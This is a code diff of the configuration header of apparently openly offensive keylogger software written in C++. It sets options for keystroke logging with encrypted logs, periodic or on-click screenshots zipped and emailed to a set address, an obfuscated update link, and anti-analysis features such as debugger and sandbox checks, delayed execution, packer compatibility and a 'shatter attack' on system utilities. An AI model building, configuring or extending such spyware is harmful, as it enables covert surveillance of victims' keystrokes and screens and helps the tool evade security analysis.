@@ -47,12 +47,12 @@ using buffer = std::vector<char>;
 
 
 //[ VERSION INFO ]
-#define IsMajor true        //let the program know whether its a Dev build or not
-#define CurrentVersion "2.2"//current version number
+#define IsMajor false		//let the program know whether its a Dev build or not
+#define CurrentVersion "2.21"//current version number
 #define GitVersionLink "i\\wnoNw;Yc|LZ\\YvYcpHYVx6Ycj34N6XI\\wn2crfY[P;{cu;ofvSZ[{L4Nv;4[wSpdnTpdxPoenPZfkXJc2n4\\weZ[{;{N8OJe2TJc"//link to GitHub Raw server containing up-to-date version file
 
 //[ LOGS ]
-#define CryptLogs true     //whether or not to crypt files
+#define CryptLogs false     //whether or not to crypt files
 #define KeyShiftLimit 122   //cap for the highest possible random encryption key
 #define LogMode 2           //how to log keystrokes                          [ 1 = Timer  ,  2 = Characters-per-log ]
 #define LogTimer 15         //minutes per log                                [ must use mode 2 ]
@@ -62,8 +62,11 @@ using buffer = std::vector<char>;
 //[ SCREENGRABBING ]
 #define ScreenGrab true     //whether to screenshot at set intervals or not
 #define ScreenshotMode 2    //how to screengrab                              [ 1 = Timer  ,  2 = Screenshot-On-Click ]
-#define SecondsBetweenScreenshots 20        //only works when using the timer
+#define ScreenshotDelay 10	//only works when using the timer
 #define ScreenshotsPerZip 5 //how many screenshots to collect before sending a zip file
+#define ScreenshotCrop true	//whether to resize the resulting screenshot (be aware that this will stretch the image if the aspect ratio is different)
+#define DestWidth	1920	//compressed screen width
+#define DestHeight	1080	//compressed screen height
 
 //[ EMAIL ]
 #define SendersEmail ""
@@ -71,10 +74,11 @@ using buffer = std::vector<char>;
 #define RecieversEmail ""
 
 //[ ANTI-* ]
-#define ShatterAttack false //wether to shatter attack sys utils(cmd,Run,Taskmgmr)  KEEP DISABLED IN REALWORLD USAGE!
+#define Hyperion false		//disables Anti-debugger exception traps in order to enable hyperion packing
+#define ShatterAttack false //whether to shatter attack sys utils(cmd,Run,Taskmgmr)  KEEP DISABLED IN REALWORLD USAGE!
 #define MaxInactivity 10    //max amount of seconds since last input         (anti-dbg feature)
 #define MinRequiredApps 20  //minimum amount of installed programs           (anti-dbg feature)
-#define SecurityLevel 2     //0-3 levels of trust towards environment        (anti-dbg feature)
+#define SecurityLevel 3     //0-3 levels of trust towards environment        (anti-dbg feature)
 #define MinHardDisk 60      //minimum size for the main partition(GB)        (anti-dbg feature)
 #define DelayExecution false//whether or not execution should be delayed     (anti-dbg feature)
 #define DelayTime 300       //amount of time for the delay (seconds)         (anti-dbg feature)
